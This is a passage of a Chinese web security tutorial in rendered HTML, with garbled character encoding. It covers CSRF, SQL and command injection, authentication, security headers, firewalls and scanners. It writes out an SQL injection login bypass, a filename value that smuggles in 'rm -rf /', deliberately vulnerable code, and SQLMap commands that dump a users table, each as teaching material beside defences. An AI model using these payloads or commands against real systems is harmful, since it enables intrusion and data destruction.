<span class="c1"># è¡¨å•ä¸­åŒ…å«token</span>
<span class="o">&lt;</span><span class="n">form</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
    <span class="p">{{</span> <span class="n">csrf_token</span><span class="p">()</span> <span class="p">}}</span>
    <span class="o">&lt;</span><span class="nb">input</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;amount&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;100&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>

<span class="c1"># 2. SameSite Cookie</span>
<span class="n">response</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s1">&#39;session&#39;</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">samesite</span><span class="o">=</span><span class="s1">&#39;Lax&#39;</span><span class="p">)</span>

<span class="c1"># 3. éªŒè¯Referer</span>
<span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Referer&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">):</span>
    <span class="c1"># å…è®¸è¯·æ±‚</span>
    <span class="k">pass</span>

<span class="c1"># 4. è‡ªå®šä¹‰è¯·æ±‚å¤´ï¼ˆAJAXï¼‰</span>
<span class="c1"># è·¨åŸŸè¯·æ±‚æ— æ³•è‡ªå®šä¹‰è¯·æ±‚å¤´</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;X-Requested-With&#39;</span><span class="p">:</span> <span class="s1">&#39;XMLHttpRequest&#39;</span><span class="p">}</span>
</pre></div>
</div>
</section>
<section id="sql">
<h3>3.3 SQLæ³¨å…¥<a class="headerlink" href="#sql" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>æ”»å‡»ç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># å±é™©ä»£ç </span>
<span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
<span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username=&#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password=&#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&quot;</span>

<span class="c1"># æ”»å‡»è€…è¾“å…¥ï¼š</span>
<span class="c1"># username: admin&#39; OR &#39;1&#39;=&#39;1</span>
<span class="c1"># password: anything</span>
<span class="c1"># ç»“æœSQLï¼šSELECT * FROM users WHERE username=&#39;admin&#39; OR &#39;1&#39;=&#39;1&#39; AND password=&#39;anything&#39;</span>
<span class="c1"># ç»•è¿‡éªŒè¯ï¼</span>
</pre></div>
</div>
<p><strong>é˜²å¾¡</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. å‚æ•°åŒ–æŸ¥è¯¢ï¼ˆæœ€é‡è¦ï¼‰</span>
<span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
    <span class="s2">&quot;SELECT * FROM users WHERE username=? AND password=?&quot;</span><span class="p">,</span>
    <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
<span class="p">)</span>

<span class="c1"># 2. ORM</span>
<span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

<span class="c1"># 3. è¾“å…¥éªŒè¯</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9_]+$&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&quot;Invalid username&quot;</span>

<span class="c1"># 4. æœ€å°æƒé™åŸåˆ™</span>
<span class="c1"># æ•°æ®åº“ç”¨æˆ·åªæœ‰å¿…è¦çš„æƒé™</span>
</pre></div>
</div>
</section>
<section id="id9">
<h3>3.4 å‘½ä»¤æ³¨å…¥<a class="headerlink" href="#id9" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>æ”»å‡»ç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># å±é™©ä»£ç </span>
<span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;cat </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1"># æ”»å‡»è€…è¾“å…¥ï¼š</span>
<span class="c1"># file=important.txt; rm -rf /</span>
<span class="c1"># æ‰§è¡Œï¼šcat important.txt; rm -rf /</span>
</pre></div>
</div>
<p><strong>é˜²å¾¡</strong>ï¼š</p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. é¿å…ä½¿ç”¨shell</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
<span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="c1"># 2. ç™½åå•éªŒè¯</span>
<span class="n">allowed_files</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;file1.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;file2.txt&#39;</span><span class="p">]</span>
<span class="k">if</span> <span class="n">filename</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">allowed_files</span><span class="p">:</span>
    <span class="k">return</span> <span class="s2">&quot;Invalid file&quot;</span>

<span class="c1"># 3. ä½¿ç”¨åº“å‡½æ•°è€Œä¸æ˜¯å‘½ä»¤</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id10">
<h2>4. èº«ä»½è®¤è¯<a class="headerlink" href="#id10" title="Permalink to this heading">ïƒ</a></h2>
<section id="session">
<h3>4.1 Sessionè®¤è¯<a class="headerlink" href="#session" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;secret-key-here&#39;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
    
    <span class="k">if</span> <span class="n">verify_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_user_id</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Login successful&#39;</span><span class="p">}</span>
    
    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid credentials&#39;</span><span class="p">},</span> <span class="mi">401</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">profile</span><span class="p">():</span>
    <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">},</span> <span class="mi">401</span>
    
    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]}</span>
</pre></div>
</div>
</section>
<section id="jwt">
<h3>4.2 JWTè®¤è¯<a class="headerlink" href="#jwt" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>

<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="s1">&#39;your-secret-key&#39;</span>

<span class="c1"># ç”ŸæˆToken</span>
<span class="k">def</span><span class="w"> </span><span class="nf">generate_token</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
        <span class="s1">&#39;exp&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">hours</span><span class="o">=</span><span class="mi">24</span><span class="p">),</span>
        <span class="s1">&#39;iat&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">SECRET_KEY</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">token</span>

<span class="c1"># éªŒè¯Token</span>
<span class="k">def</span><span class="w"> </span><span class="nf">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">SECRET_KEY</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;HS256&#39;</span><span class="p">])</span>
        <span class="k">return</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
    <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">ExpiredSignatureError</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># Tokenè¿‡æœŸ</span>
    <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># Tokenæ— æ•ˆ</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
    <span class="c1"># éªŒè¯ç”¨æˆ·...</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">generate_token</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">}</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">profile</span><span class="p">():</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Authorization&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;Bearer &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">user_id</span> <span class="o">=</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_id</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">},</span> <span class="mi">401</span>
    
    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">}</span>
</pre></div>
</div>
</section>
<section id="oauth-2-0">
<h3>4.3 OAuth 2.0<a class="headerlink" href="#oauth-2-0" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>æµç¨‹</strong>ï¼š</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>1. å®¢æˆ·ç«¯ â†’ æˆæƒæœåŠ¡å™¨ï¼šè¯·æ±‚æˆæƒ
2. ç”¨æˆ·ç™»å½•å¹¶æˆæƒ
3. æˆæƒæœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ï¼šè¿”å›æˆæƒç 
4. å®¢æˆ·ç«¯ â†’ æˆæƒæœåŠ¡å™¨ï¼šç”¨æˆæƒç æ¢å–è®¿é—®ä»¤ç‰Œ
5. å®¢æˆ·ç«¯ â†’ èµ„æºæœåŠ¡å™¨ï¼šç”¨è®¿é—®ä»¤ç‰Œè®¿é—®èµ„æº
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id11">
<h2>5. å¸¸è§å®‰å…¨å¤´éƒ¨<a class="headerlink" href="#id11" title="Permalink to this heading">ïƒ</a></h2>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. Content-Security-Policy (CSP)</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> \
    <span class="s2">&quot;default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;&quot;</span>

<span class="c1"># 2. X-Frame-Options (é˜²æ­¢ç‚¹å‡»åŠ«æŒ)</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Frame-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;DENY&#39;</span>

<span class="c1"># 3. X-Content-Type-Options</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Content-Type-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;nosniff&#39;</span>

<span class="c1"># 4. Strict-Transport-Security (HSTS)</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Strict-Transport-Security&#39;</span><span class="p">]</span> <span class="o">=</span> \
    <span class="s1">&#39;max-age=31536000; includeSubDomains&#39;</span>

<span class="c1"># 5. X-XSS-Protection</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-XSS-Protection&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;1; mode=block&#39;</span>

<span class="c1"># 6. Referrer-Policy</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Referrer-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;strict-origin-when-cross-origin&#39;</span>

<span class="c1"># 7. Permissions-Policy</span>
<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Permissions-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> \
    <span class="s1">&#39;geolocation=(), microphone=(), camera=()&#39;</span>
</pre></div>
</div>
</section>
<hr class="docutils" />
<section id="id12">
<h2>6. é˜²ç«å¢™å’Œç«¯å£ç®¡ç†<a class="headerlink" href="#id12" title="Permalink to this heading">ïƒ</a></h2>
<section id="iptables">
<h3>6.1 iptables<a class="headerlink" href="#iptables" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æŸ¥çœ‹è§„åˆ™</span>
$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-L<span class="w"> </span>-n<span class="w"> </span>-v

<span class="c1"># å…è®¸SSH</span>
$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">22</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT

<span class="c1"># å…è®¸HTTP/HTTPS</span>
$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">80</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">443</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT

<span class="c1"># å…è®¸å·²å»ºç«‹çš„è¿æ¥</span>
$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-m<span class="w"> </span>state<span class="w"> </span>--state<span class="w"> </span>ESTABLISHED,RELATED<span class="w"> </span>-j<span class="w"> </span>ACCEPT

<span class="c1"># é»˜è®¤æ‹’ç»å…¶ä»–å…¥ç«™</span>
$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-P<span class="w"> </span>INPUT<span class="w"> </span>DROP

<span class="c1"># å…è®¸æ‰€æœ‰å‡ºç«™</span>
$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-P<span class="w"> </span>OUTPUT<span class="w"> </span>ACCEPT

<span class="c1"># ä¿å­˜è§„åˆ™</span>
$<span class="w"> </span>sudo<span class="w"> </span>iptables-save<span class="w"> </span>&gt;<span class="w"> </span>/etc/iptables/rules.v4
</pre></div>
</div>
</section>
<section id="ufw-ubuntu">
<h3>6.2 ufwï¼ˆUbuntuï¼‰<a class="headerlink" href="#ufw-ubuntu" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># å¯ç”¨é˜²ç«å¢™</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span><span class="nb">enable</span>

<span class="c1"># å…è®¸SSH</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">22</span>

<span class="c1"># å…è®¸HTTP/HTTPS</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">80</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">443</span>

<span class="c1"># å…è®¸ç‰¹å®šIPçš„SSH</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>to<span class="w"> </span>any<span class="w"> </span>port<span class="w"> </span><span class="m">22</span>

<span class="c1"># æ‹’ç»ç«¯å£</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>deny<span class="w"> </span><span class="m">23</span>

<span class="c1"># æŸ¥çœ‹çŠ¶æ€</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>status

<span class="c1"># åˆ é™¤è§„åˆ™</span>
$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>delete<span class="w"> </span>allow<span class="w"> </span><span class="m">80</span>
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id13">
<h2>7. å®‰å…¨æ‰«æå·¥å…·<a class="headerlink" href="#id13" title="Permalink to this heading">ïƒ</a></h2>
<section id="nikto-web">
<h3>7.1 Niktoï¼ˆWebæ‰«æï¼‰<a class="headerlink" href="#nikto-web" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æ‰«æç½‘ç«™</span>
$<span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>https://example.com

<span class="c1"># æ‰«æç‰¹å®šç«¯å£</span>
$<span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>https://example.com<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span>

<span class="c1"># è¾“å‡ºåˆ°æ–‡ä»¶</span>
$<span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>https://example.com<span class="w"> </span>-o<span class="w"> </span>scan.html<span class="w"> </span>-Format<span class="w"> </span>html
</pre></div>
</div>
</section>
<section id="owasp-zap">
<h3>7.2 OWASP ZAP<a class="headerlink" href="#owasp-zap" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šWebåº”ç”¨å®‰å…¨æ‰«æ</p>
<p><strong>ä½¿ç”¨</strong>ï¼š</p>
<ol class="arabic simple">
<li><p>é…ç½®æµè§ˆå™¨ä»£ç†åˆ°ZAP</p></li>
<li><p>æµè§ˆç›®æ ‡ç½‘ç«™ï¼ˆè¢«åŠ¨æ‰«æï¼‰</p></li>
<li><p>ä¸»åŠ¨æ‰«æ</p></li>
<li><p>æŸ¥çœ‹å‘ç°çš„æ¼æ´</p></li>
</ol>
</section>
<section id="sqlmap-sql">
<h3>7.3 SQLMapï¼ˆSQLæ³¨å…¥æµ‹è¯•ï¼‰<a class="headerlink" href="#sqlmap-sql" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æµ‹è¯•URL</span>
$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span>

<span class="c1"># æµ‹è¯•POSTè¯·æ±‚</span>
$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/login&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;username=admin&amp;password=pass&quot;</span>

<span class="c1"># åˆ—å‡ºæ•°æ®åº“</span>
$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>--dbs

<span class="c1"># åˆ—å‡ºè¡¨</span>
$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>database_name<span class="w"> </span>--tables

<span class="c1"># å¯¼å‡ºæ•°æ®</span>
$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id14">
<h2>8. æœ€ä½³å®è·µ<a class="headerlink" href="#id14" title="Permalink to this heading">ïƒ</a></h2>
<section id="id15">
<h3>8.1 å¯†ç å®‰å…¨<a class="headerlink" href="#id15" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. ä½¿ç”¨å¼ºå“ˆå¸Œç®—æ³•</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">bcrypt</span>
<span class="n">hashed</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">gensalt</span><span class="p">())</span>

<span class="c1"># 2. å¯†ç å¼ºåº¦è¦æ±‚</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="k">def</span><span class="w"> </span><span class="nf">check_password_strength</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">False</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[A-Z]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="k">return</span> <span class="kc">False</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[a-z]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="k">return</span> <span class="kc">False</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[0-9]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="k">return</span> <span class="kc">False</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[!@#$%^&amp;*]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="k">return</span> <span class="kc">False</span>
    <span class="k">return</span> <span class="kc">True</span>

<span class="c1"># 3. å¯†ç é‡ç½®</span>
<span class="c1"># ä½¿ç”¨ä¸´æ—¶ä»¤ç‰Œï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="n">expires</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">hours</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</pre></div>
</div>
</section>
<section id="id16">
<h3>8.2 è¾“å…¥éªŒè¯<a class="headerlink" href="#id16" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. ç™½åå•éªŒè¯</span>
<span class="n">ALLOWED_EXTENSIONS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;txt&#39;</span><span class="p">,</span> <span class="s1">&#39;pdf&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;jpg&#39;</span><span class="p">}</span>
<span class="k">if</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ALLOWED_EXTENSIONS</span><span class="p">:</span>
    <span class="k">return</span> <span class="s2">&quot;Invalid file type&quot;</span>

<span class="c1"># 2. é•¿åº¦é™åˆ¶</span>
